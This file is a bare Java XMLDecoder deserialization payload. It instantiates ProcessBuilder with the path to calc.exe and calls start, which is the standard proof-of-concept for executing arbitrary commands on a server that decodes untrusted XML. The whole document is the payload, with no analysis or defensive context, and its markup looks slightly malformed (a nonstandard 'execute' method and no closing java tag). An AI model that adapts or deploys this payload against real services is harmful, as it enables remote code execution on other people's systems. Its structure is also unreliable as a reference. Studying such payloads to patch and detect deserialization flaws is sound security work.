<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_17" class="java.beans.XMLDecoder">
 <object class="java.lang.ProcessBuilder">
  <void method="execute">
      <array class="java.lang.String" length="1">
          <void index="0">
              <string>c:\\Windows\\System32\\calc.exe</string>
          </void>
      </array>
      <void method="start" />
  </void>
 </object>
